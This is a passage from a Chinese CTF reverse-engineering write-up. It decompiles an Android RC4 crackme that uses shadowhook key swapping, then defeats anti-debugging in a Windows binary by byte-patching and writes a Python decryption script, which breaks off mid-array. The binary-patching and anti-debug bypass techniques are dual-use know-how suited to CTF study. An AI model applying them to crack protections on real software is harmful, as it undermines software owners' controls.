__int64))_JNIEnv::ReleaseStringUTFChars)(a1, a3, StringUTFChars);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>ee = [  <br>  <span class="hljs-number">0x19</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x20</span>, <br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x0C</span>, <br>  <span class="hljs-number">0x16</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x18</span>, <br>  <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x02</span>]<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>可以看出 ee 数组中的每一个元素都不等于 0x7F,说明 ee[i] !&#x3D; 0x7F 的结果恒等于 1，所以只有当传入的字符串前 32 个字符是 32 个连续的 \x01 时，这个函数才会返回 1，否则返回 0</p><p>在 JNI_Onload 里面看到函数 sub_1C430</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_1C430</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 i; <span class="hljs-comment">// [xsp+18h] [xbp-58h]</span><br>  __int64 StringUTFChars; <span class="hljs-comment">// [xsp+20h] [xbp-50h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v8; <span class="hljs-comment">// [xsp+44h] [xbp-2Ch]</span><br>  _QWORD v9[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [xsp+48h] [xbp-28h] BYREF</span><br><br>  v9[<span class="hljs-number">4</span>] = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) + <span class="hljs-number">40</span>);<br>  sub_1C010();<br>  StringUTFChars = _JNIEnv::GetStringUTFChars();<br>  sub_1C078(v9, StringUTFChars, kk);<br>  eee[<span class="hljs-number">0</span>] = <span class="hljs-number">0xCD8413F20B6FCE4CL</span>L;<br>  qword_49828 = <span class="hljs-number">0x5C9B1B43933043CFL</span>L;<br>  qword_49830 = <span class="hljs-number">0x1C6EB6E1A546128EL</span>L;<br>  qword_49838 = <span class="hljs-number">0x77C6E3D7AE009A3EL</span>L;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i &lt;= <span class="hljs-number">3</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v9[i] != eee[i] )<br>    &#123;<br>      _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);<br>      v8 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    &#125;<br>  &#125;<br>  _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);<br>  v8 = <span class="hljs-number">1</span>;<br>LABEL_7:<br>  _ReadStatusReg(ARM64_SYSREG(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>));<br>  <span class="hljs-keyword">return</span> v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>提取出<strong>密文</strong>: <code>0xCD8413F20B6FCE4C, 0x5C9B1B43933043CF, 0x1C6EB6E1A546128E, 0x77C6E3D7AE009A3E</code></p><p>sub_1C010</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_1C010</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// x0</span><br><br>  result = shadowhook_hook_sym_addr(sub_11073, sub_21345, <span class="hljs-number">0LL</span>);<br>  stub = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_11073</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sub_11073</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// w9</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [xsp+24h] [xbp-13Ch]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [xsp+28h] [xbp-138h]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [xsp+2Ch] [xbp-134h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [xsp+30h] [xbp-130h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+34h] [xbp-12Ch]</span><br>  _OWORD v8[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [xsp+50h] [xbp-110h] BYREF</span><br>  __int64 v9; <span class="hljs-comment">// [xsp+158h] [xbp-8h]</span><br><br>  v9 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) + <span class="hljs-number">40</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0xFF</span>; ++i )<br>    ss[i] = i;<br>  v5 = __strlen_chk(a1, <span class="hljs-number">0xFFFFFFFFFFFFFFFFL</span>L);<br>  srand(<span class="hljs-number">0x217u</span>);<br>  <span class="hljs-built_in">memset</span>(v8, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v8));<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">255</span>; ++j )<br>    *((_BYTE *)v8 + j) = a1[j % v5];<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">255</span>; ++k )<br>  &#123;<br>    v1 = (<span class="hljs-type">unsigned</span> __int8)(v3 + ss[k] + *((_BYTE *)v8 + k));<br>    <span class="hljs-keyword">if</span> ( v3 + ss[k] + *((<span class="hljs-type">unsigned</span> __int8 *)v8 + k) &lt;= <span class="hljs-number">0</span> )<br>      v1 = -(<span class="hljs-type">unsigned</span> __int8)-(<span class="hljs-type">char</span>)(v3 + ss[k] + *((_BYTE *)v8 + k));<br>    v3 = v1;<br>    sub_1BC30((<span class="hljs-type">char</span> *)&amp;ss[k], (<span class="hljs-type">char</span> *)&amp;ss[v1]);<br>  &#125;<br>  _ReadStatusReg(ARM64_SYSREG(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>));<br>&#125;<br><br><span class="hljs-type">char</span> *__fastcall <span class="hljs-title function_">sub_1BC30</span><span class="hljs-params">(<span class="hljs-type">char</span> *result, <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">char</span> v2; <span class="hljs-comment">// [xsp+Fh] [xbp-11h]</span><br><br>  v2 = *result;<br>  *result = *a2;<br>  *a2 = v2;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_11073 主要实现了 RC4 里面的 KSA，这里找到的 key 是 <code>this_is_a_key</code><br>等效 python ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">list</span>:<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    key_len = <span class="hljs-built_in">len</span>(key)<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_len]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br></code></pre></td></tr></table></figure><p>这里面还有个 srand(0x217) 先放一边</p><p>sub_21345</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sub_21345</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int8 *a1)</span><br>&#123;<br>  <span class="hljs-type">void</span> *v1; <span class="hljs-comment">// x30</span><br>  <span class="hljs-type">void</span> (__fastcall *prev_func)(_BYTE *); <span class="hljs-comment">// [xsp+8h] [xbp-58h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [xsp+24h] [xbp-3Ch]</span><br>  _BYTE v4[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [xsp+30h] [xbp-30h] BYREF</span><br>  _BYTE v5[<span class="hljs-number">13</span>]; <span class="hljs-comment">// [xsp+38h] [xbp-28h]</span><br>  _BYTE v6[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [xsp+48h] [xbp-18h] BYREF</span><br>  __int64 v7; <span class="hljs-comment">// [xsp+58h] [xbp-8h]</span><br><br>  v7 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)) + <span class="hljs-number">40</span>);<br>  ShadowhookStackScope::ShadowhookStackScope((ShadowhookStackScope *)v4, v1);<br>  *(_QWORD *)&amp;v5[<span class="hljs-number">5</span>] = <span class="hljs-number">0x3C37311A241A312CL</span>L; <span class="hljs-comment">//这是把 8 字节写入 v5[5]~v5[12]</span><br>  *(_QWORD *)v5 = <span class="hljs-number">0x1A312C1A20332C02L</span>L;  <span class="hljs-comment">// 这是把 8 字节写入 v5[0]~v5[7]</span><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">12</span>; ++i )<br>    v6[i] = v5[i] ^ <span class="hljs-number">0x45</span>;<br>  prev_func = (<span class="hljs-type">void</span> (__fastcall *)(_BYTE *))shadowhook_get_prev_func(sub_11073);<br>  prev_func(v6);<br>  srand(<span class="hljs-number">0x159357u</span>);<br>  ShadowhookStackScope::~ShadowhookStackScope((ShadowhookStackScope *)v4);<br>  _ReadStatusReg(ARM64_SYSREG(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>对 v5 数组中的前 13 个数据进行异或 0x45 得到 v6 数组 ，然后 hook 了函数 sub_11073,把 v6 作为参数传入，srand(0x159357)设置了一个随机数种子，把之前的 0x217 给改了</p><p>计算出 v6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">v5 = [<span class="hljs-number">0</span>] * <span class="hljs-number">13</span><br><br><span class="hljs-comment"># 写入 v5[5]~v5[12] (小端序)</span><br>val1 = <span class="hljs-number">0x3C37311A241A312C</span><br>v5_bytes_5_12 = [(val1 &gt;&gt; (<span class="hljs-number">8</span>*i)) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>v5[<span class="hljs-number">5</span>:<span class="hljs-number">13</span>] = v5_bytes_5_12<br><br><span class="hljs-comment"># 写入 v5[0]~v5[7] (小端序) 注意有覆盖</span><br>val2 = <span class="hljs-number">0x1A312C1A20332C02</span><br>v5_bytes_0_7 = [(val2 &gt;&gt; (<span class="hljs-number">8</span>*i)) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>v5[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>] = v5_bytes_0_7<br><br><br>v6 = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(v5[i] ^ <span class="hljs-number">0x45</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>))<br><span class="hljs-built_in">print</span>(v6)<br><br><span class="hljs-comment"># Give_it_a_try</span><br></code></pre></td></tr></table></figure><p>所以 RC4 的密钥即为 <code>Give_it_a_try</code></p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p><img src="/../images/NPCCTF2025/s1.png"><br>先是一个RC4(密钥被修改过的)，再根据随机数进行了移位异或 </p><h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p><del>和题目描述的一样，坑点确实多</del></p><h4 id="修花"><a href="#修花" class="headerlink" title="修花"></a>修花</h4><p>main 函数有花指令，三种结构<br>一种是 jz jnz 的</p><p><img src="/../images/NPCCTF2025/b1.png"></p><p>一种 xor test + jz jnz 的</p><p><img src="/../images/NPCCTF2025/b0.png"></p><p>一种是 call retn 的</p><p><img src="/../images/NPCCTF2025/b2.png"></p><p>修好之后的 main 函数</p><p><img src="/../images/NPCCTF2025/b3.png"></p><p>其中 sub_41132F 里面是反调 IsDebuggerPresent()， sub_4110D2 里是 RC4 的 KSA</p><p><img src="/../images/NPCCTF2025/b4.png"></p><p>sub_41111D 里面是 PRGA ，但是在最后又多了一步异或 0x47</p><p><img src="/../images/NPCCTF2025/b5.png"></p><p>除此之外，还发现了三个 PRGA</p><p><img src="/../images/NPCCTF2025/b6.png">  </p><p>sub_4111FE 是一个查表替换</p><p><img src="/../images/NPCCTF2025/b12.png"></p><h4 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h4><p>程序有反调试，一开始调试就退出<br>打断点测试发现程序在 <code> _initterm(First, Last);</code>初始化时会触发异常退出,在此处打断点进行单步调试，发现了函数 sub_412AA0</p><p><img src="/../images/NPCCTF2025/b7.png"></p><p>通过动态解析的方式调用 api，动调解密发现是 Ntdll 和 ZwSetInformationThread,反调试</p><p><img src="/../images/NPCCTF2025/b8.png"></p><p><img src="/../images/NPCCTF2025/b9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">00412B7E                 mov     esi, esp<br>00412B80                 push    0<br>00412B82                 push    0<br>00412B84                 push    11h<br>00412B86                 mov     edi, esp<br>00412B88                 call    ds:GetCurrentThread<br>00412B8E                 cmp     edi, esp<br>00412B90                 call    j___RTC_CheckEsp<br>00412B95                 push    eax<br>00412B96                 call    [ebp+var_2C] ; 这里是反调试函数的调用<br>00412B99                 cmp     esi, esp<br>00412B9B                 call    j___RTC_CheckEsp<br></code></pre></td></tr></table></figure><p>在调用 call [ebp+var_2C] 之前，代码使用 mov esi, esp 保存了当前的栈指针 esp，调用之后，有 cmp esi, esp 和 call j___RTC_CheckEsp 来检查栈指针是否一致，如果只 NOP 掉 call 指令，栈上的参数不会被清理，导致 esp 比 esi 小 16 字节（因为参数仍在栈上），从而触发栈检查失败，程序会异常终止</p><p>函数调用前有四个参数被压栈</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">11h</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span> (来自GetCurrentThread)<br></code></pre></td></tr></table></figure><p>每个push操作压入 4 字节，所以总共压入了 16 字节,在正常的函数调用中，这些参数会被被调函数清理（如果使用stdcall调用约定），或者由调用者清理（如果使用cdecl调用约定）。但在这里，由于我们跳过了调用，就需要自己清理这些参数，以保持栈平衡，所以要把这些 push 和 call 一并 nop 掉</p><p>或者换种方式，把 00412B96 地址处原本的 <code>call [ebp+var_2C]</code>(调用反调试函数) 替换成 <code>add esp, 10h</code>，即把原始的机器码 <code>FF 55 D4</code> 改成 <code>83 C4 10</code>；add esp, 10h 指令将栈指针 esp 增加 16 字节，清理了栈上的 4 个参数；替换后，栈指针 esp 恢复到参数压栈前的状态，与 esi 保存的值一致，因此后续的 cmp esi, esp 会通过，栈检查不会触发异常，同时也绕过了反调试</p><p>进入 main 函数逻辑，nop 掉上文提到的 IsDebuggerPresent 绕过反调试,只 nop 调试时还是会报错，将 004139C2 的 <code>call sub_41132F</code> 也 nop 掉，然后把 004139C7 的 <code>test eax, eax</code> 替换为 xor eax, eax（33 C0），这样 eax 总为 0 ，jz 跳转一定会执行</p><p>除此之外，main 里面还有 try except 结构手动触发除零异常反调试</p><p><img src="/../images/NPCCTF2025/b10.png"></p><p>有一行 <code>idiv [ebp+var_80]</code>，其中 [ebp+var_80] 被设置为 0,这会导致除以零异常，从而触发 __except 块<br>修改代码，不执行 __try 块，直接跳转到 __except 块(地址 00413AD0)；开始地址是 00413A96，jmp 指令长度：2 字节（EB + 偏移量），下一条指令地址：00413A98，目标地址：00413AD0，偏移量 &#x3D; 00413AD0 - 00413A98 &#x3D; 38，因此用 <code>EB 38</code> 覆盖 00413A96 处的指令，并用 90 填充剩余字节</p><h4 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h4><p>改完之后 main 函数的逻辑多了一块,现在加密逻辑完整了</p><p><img src="/../images/NPCCTF2025/b11.png"></p><p>用 key1 经过 KSA 之后生成了一个 S_box1 -&gt; 经过 PRGA0 + 异或 0x47 处理得到 byte_41C1B8 -&gt; 输入 input -&gt; 用 key2 由经过了一次 KSA 生成 S_box2 -&gt; sub_4111FE 函数使用 byte_41C1B8 对 input 进行查表替换 -&gt; 根据模 3 的结果用不同的 PRGA 进行处理(魔改的最后一步异或值在动调的时候取) -&gt; 对 input 进行循环异或</p><p>exp :</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">KSA</span>(<span class="hljs-params">key</span>):<br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>    <span class="hljs-keyword">return</span> S<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">single_byte_PRGA</span>(<span class="hljs-params">S, i, j, xor_value</span>):<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    j = (j + S[i]) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br>    K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>    <span class="hljs-keyword">return</span> K ^ xor_value, i, j<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">one_byte_prga</span>(<span class="hljs-params">sbox, data_byte, key_byte</span>):<br>    index = sbox[<span class="hljs-number">1</span>]<br>    sbox[<span class="hljs-number">1</span>], sbox[index] = sbox[index], sbox[<span class="hljs-number">1</span>]<br>    k = sbox[(sbox[<span class="hljs-number">1</span>] + sbox[index]) % <span class="hljs-number">256</span>]<br>    result = data_byte ^ k ^ key_byte<br>    <span class="hljs-keyword">return</span> sbox, result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_lastxor</span>(<span class="hljs-params">data</span>):<br>    data = <span class="hljs-built_in">bytearray</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>            data[<span class="hljs-number">6</span> * i + j] ^= data[<span class="hljs-number">6</span> * i + j - <span class="hljs-number">1</span>]<br>        data[<span class="hljs-number">6</span> * i] ^= data[<span class="hljs-number">6</span> * i + <span class="hljs-number">5</span>]<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec_lastxor</span>(<span class="hljs-params">data</span>):<br>    data = <span class="hljs-built_in">bytearray</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        data[<span class="hljs-number">6</span> * i] ^= data[<span class="hljs-number">6</span> * i + <span class="hljs-number">5</span>]<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            data[<span class="hljs-number">6</span> * i + j] ^= data[<span class="hljs-number">6</span> * i + j - <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitution</span>(<span class="hljs-params">data,S_box</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>         data[i] = data[S_box[i]]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_substitution</span>(<span class="hljs-params">data,S_box</span>):<br>    inv_S2 = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        inv_S2[S_box[i]] = i<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        data[i] = inv_S2[data[i]]<br><br>data1 = [<br>  <span class="hljs-number">0x09</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC0</span>,<br>  <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xA1</span>,<br>  <span class="hljs-number">0x47</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x39</span>,<br>  <span class="hljs-number">0x97</span>, <span class="hljs-number">0xDB</span>, <span 